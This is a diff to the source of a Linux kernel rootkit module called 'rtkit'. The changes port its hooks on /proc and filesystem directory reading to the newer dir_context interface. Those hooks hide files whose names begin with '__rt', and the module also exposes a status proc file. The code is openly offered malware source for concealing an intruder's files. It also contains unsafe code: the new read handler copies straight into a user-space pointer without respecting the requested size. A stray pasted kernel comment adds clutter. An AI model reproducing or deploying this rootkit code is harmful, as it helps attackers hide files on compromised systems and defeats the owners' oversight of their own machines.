@@ -93,27 +93,57 @@ static int proc_filldir_new(void *buf, const char *name, int namelen, loff_t off
 
 static int proc_readdir_new(struct file *filp, void *dirent, filldir_t filldir)
 {
-	proc_filldir_orig = filldir;
-//	return proc_readdir_orig(filp, dirent, proc_filldir_new);
+	proc_readdir_orig(filp, dirent, proc_filldir_new);	
 	return 0;
 }
 
-static int fs_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
+//static int fs_filldir_new(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
+
+static int fs_filldir_new(struct dir_context *ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
 {
+	printk("%s\n", name);
 	if (hide_files && (!strncmp(name, "__rt", 4) || !strncmp(name, "10-__rt", 7))) return 0;
-	return fs_filldir_orig(buf, name, namelen, offset, ino, d_type);
+	return fs_filldir_orig(ctx, name, namelen, offset, ino, d_type);
 }
 
 static int fs_readdir_new(struct file *f, struct dir_context *d)
 {
-//	fs_filldir_orig = filldir;
-	return fs_readdir_orig(f, d);
+	int ret;
+	char buf[4096];
+	char* tmp;
+//	printk("test\n");
+	struct dir_context dc = (struct dir_context) {
+//		.actor = fs_filldir_new,
+		.actor = d->actor,
+		.pos = d->pos
+	};
+
+	fs_filldir_orig = d->actor;
+	ret = fs_readdir_orig(f, &dc);
+	tmp = d_path(&f->f_path, buf, 4096);
+	if (tmp)
+		printk("Path: %s\n", tmp);
+	return ret;
 //	return 0;
 }
 
-static int rtkit_read(char *buffer, char **buffer_location, off_t off, int count, int *eof, void *data)
-{
-	int size;
+
+/**
+154  *      seq_read -      ->read() method for sequential files.
+155  *      @file: the file to read from
+156  *      @buf: the buffer to read to
+157  *      @size: the maximum number of bytes to read
+158  *      @ppos: the current position in the file
+159  *
+160  *      Ready-made ->f_op->read()
+161  */
+
+//static int rtkit_read(char *buffer, char **buffer_location, off_t off, int count, int *eof, void *data)
+ssize_t rtkit_read(struct file *f, char __user *buffer, size_t s, loff_t *off) {
+	size_t size;
+
+
+	printk("read %u\n", s);
 	
 	sprintf(module_status, 
 "RTKIT\n\
@@ -133,15 +163,11 @@ STATUS\n\
 
 	size = strlen(module_status);
 
-	if (off >= size) return 0;
+	if (*off >= size) return 0;
   
-	if (count >= size-off) {
-		memcpy(buffer, module_status+off, size-off);
-	} else {
-		memcpy(buffer, module_status+off, count);
-	}
-  
-	return size-off;
+	memcpy(buffer, module_status, size);
+	*off = size;  
+	return size;
 }
 
 static int rtkit_write(struct file *file, const char __user *buff, unsigned long count, void *data)
